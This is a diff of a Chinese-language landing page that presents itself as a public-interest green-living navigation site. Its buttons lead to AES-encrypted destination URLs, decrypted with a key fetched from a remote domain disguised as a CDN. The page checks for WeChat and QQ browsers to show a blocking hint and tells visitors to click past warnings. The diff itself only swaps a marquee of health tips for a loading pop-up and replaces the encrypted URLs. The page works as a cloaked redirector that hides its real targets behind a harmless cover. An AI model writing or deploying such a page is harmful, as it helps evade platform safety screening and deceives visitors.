@@ -14,16 +14,27 @@ body{display:flex;flex-direction:column;justify-content:space-between;align-item
 header{width:100%;max-width:400px;background:linear-gradient(135deg,#e8f5e9,#fff);border-radius:16px;box-shadow:0 4px 12px rgba(76,175,80,.1);padding:1.5em 1em;}
 header h1{font-size:1.8em;font-weight:600;margin-bottom:.5em;}
 header p{font-size:.95em;color:var(--gray);line-height:1.4em;}
-.marquee{width:100%;overflow:hidden;margin:1vh 0 1.5vh;}
-.marquee-track{display:flex;width:max-content;animation:marquee 25s linear infinite;}
-.marquee-item{padding-right:4rem;white-space:nowrap;font-size:.6em;color:#388e3c;}
-@keyframes marquee{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
+
 .menu{flex:1;display:flex;flex-direction:column;justify-content:center;gap:1em;width:100%;max-width:300px;margin-top:1vh;}
 @keyframes vibrate{0%{transform:translateX(0)}10%{transform:translateX(-3px)}20%{transform:translateX(3px)}30%{transform:translateX(-2px)}40%{transform:translateX(2px)}50%{transform:translateX(-1px)}60%{transform:translateX(1px)}70%{transform:translateX(-1px)}80%{transform:translateX(1px)}90%{transform:translateX(-.5px)}100%{transform:translateX(0)}}
 .menu button{background:var(--green);color:#fff;border:none;padding:1em;font-size:1.1em;border-radius:8px;cursor:pointer;animation:vibrate 3s infinite;}
 .menu button:hover{background:#388e3c;}
+
 footer{font-size:11px;color:#888;padding-bottom:1.5vh;}
 #block-hint{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#fff;display:none;justify-content:center;align-items:center;font-size:16px;z-index:9999;padding:20px;text-align:center;}
+
+/* 进入提示框 */
+#tip-box{
+  position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
+  background:linear-gradient(135deg,#4caf50,#66bb6a);
+  color:#fff;padding:14px 26px;border-radius:12px;font-size:15px;font-weight:500;
+  box-shadow:0 6px 20px rgba(0,0,0,.2);display:none;z-index:9999;
+}
+#tip-box .dot{
+  width:10px;height:10px;border-radius:50%;background:#fff;display:inline-block;margin-right:8px;
+  animation:pulseDot 1s infinite ease-in-out;
+}
+@keyframes pulseDot{0%{transform:scale(1);opacity:1}50%{transform:scale(1.5);opacity:.6}100%{transform:scale(1);opacity:1}}
 </style>
 </head>
 <body>
@@ -35,12 +46,7 @@ footer{font-size:11px;color:#888;padding-bottom:1.5vh;}
   <p>打开页面如遇提示→点继续即可</p>
 </header>
 
-<div class="marquee">
-  <div class="marquee-track">
-    <div class="marquee-item">🌱 拒绝食品浪费 · 🧘 每天10分钟冥想 · 🚲 绿色出行 · 🥦 多吃蔬果少油盐 · 🌿 回归自然 · 💧 多喝温水 · 🌍 你就是绿色生活的践行者！</div>
-    <div class="marquee-item">🌱 拒绝食品浪费 · 🧘 每天10分钟冥想 · 🚲 绿色出行 · 🥦 多吃蔬果少油盐 · 🌿 回归自然 · 💧 多喝温水 · 🌍 你就是绿色生活的践行者！</div>
-  </div>
-</div>
+<!-- 动态广播已删除 -->
 
 <div class="menu">
   <button onclick="jump('btn1')">🌱 幸福指南入口→点这里</button>
@@ -51,29 +57,38 @@ footer{font-size:11px;color:#888;padding-bottom:1.5vh;}
 
 <footer>本站为公益绿色导航页，内容来自公开资料整理</footer>
 
+<div id="tip-box"><span class="dot"></span> 正在进入...</div>
+
 <!-- CryptoJS -->
 <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
 <script>
 /* ---------- 必填配置 ---------- */
-const KEY_API = "https://cdn-assets.safe-data-access.xyz/cfg/core.xml?v=678528";   // ← 
-const encrypted = {                                       // ← 四段菜单导航
-  btn1: "U2FsdGVkX18IJu408BQQOnsaslnq9yzYHjxqFWMzAHI6mrrkJb7OHL3sioQbSl3jZ7Vq2SBQsEIah0p9dLyofay6si1yyGyyqoSyyuN9hbUaMIaSl8cN7ifhky9HN9qi",
-  btn2: "U2FsdGVkX18IJu408BQQOnsaslnq9yzYHjxqFWMzAHI6mrrkJb7OHL3sioQbSl3jZ7Vq2SBQsEIah0p9dLyofay6si1yyGyyqoSyyuN9hbUaMIaSl8cN7ifhky9HN9qi",
-  btn3: "U2FsdGVkX18IJu408BQQOnsaslnq9yzYHjxqFWMzAHI6mrrkJb7OHL3sioQbSl3jZ7Vq2SBQsEIah0p9dLyofay6si1yyGyyqoSyyuN9hbUaMIaSl8cN7ifhky9HN9qi",
-  btn4: "U2FsdGVkX18OLSZJfPhNr4l29h+qbn4EHubyR3adfWmtHO2kwG2pIQ95EodL2vyJ"
+const KEY_API = "https://cdn-assets.safe-data-access.xyz/cfg/core.xml?v=678528";
+const encrypted = {
+  btn1:"U2FsdGVkX192OwUqT1J6XfJ3SxxxOMNb840nwgTSCpePDSj+99eG1+v+yKHr+O++OMO2WCiBirdA5YUgfaZ7pLDzk57VMYKO+6xTZiM9GuVekS4gXOeQ5gE3i75eb9wq",
+  btn2:"U2FsdGVkX192OwUqT1J6XfJ3SxxxOMNb840nwgTSCpePDSj+99eG1+v+yKHr+O++OMO2WCiBirdA5YUgfaZ7pLDzk57VMYKO+6xTZiM9GuVekS4gXOeQ5gE3i75eb9wq",
+  btn3:"U2FsdGVkX192OwUqT1J6XfJ3SxxxOMNb840nwgTSCpePDSj+99eG1+v+yKHr+O++OMO2WCiBirdA5YUgfaZ7pLDzk57VMYKO+6xTZiM9GuVekS4gXOeQ5gE3i75eb9wq",
+  btn4:"U2FsdGVkX18OLSZJfPhNr4l29h+qbn4EHubyR3adfWmtHO2kwG2pIQ95EodL2vyJ"
 };
 
 /* ---------- 导航---------- */
 async function jump(id){
+  const tip=document.getElementById("tip-box");
+  tip.style.display="block";
   try{
-    const key = await fetch(KEY_API+"?t="+Date.now()).then(r=>r.text());   // 统一
-    const url = CryptoJS.AES.decrypt(encrypted[id], key).toString(CryptoJS.enc.Utf8);
-    if(url.startsWith("http")) location.href = url;
-    else alert("打开失败，请稍后再试");
-  }catch(e){ alert("网络异常，请检查连接"); }
+    const key=await fetch(KEY_API+"?t="+Date.now()).then(r=>r.text());
+    const url=CryptoJS.AES.decrypt(encrypted[id],key).toString(CryptoJS.enc.Utf8);
+    if(url.startsWith("http")){
+      setTimeout(()=>{ tip.style.display="none"; location.href=url; },1200);
+    }else{
+      alert("打开失败，请稍后再试"); tip.style.display="none";
+    }
+  }catch(e){
+    alert("网络异常，请检查连接"); tip.style.display="none";
+  }
 }
 
-/* ---------- 提示---------- */
+/* ---------- 提示 ---------- */
 (function(){
   if(/micromessenger|qq\//i.test(navigator.userAgent))
     document.getElementById("block-hint").style.display="flex";
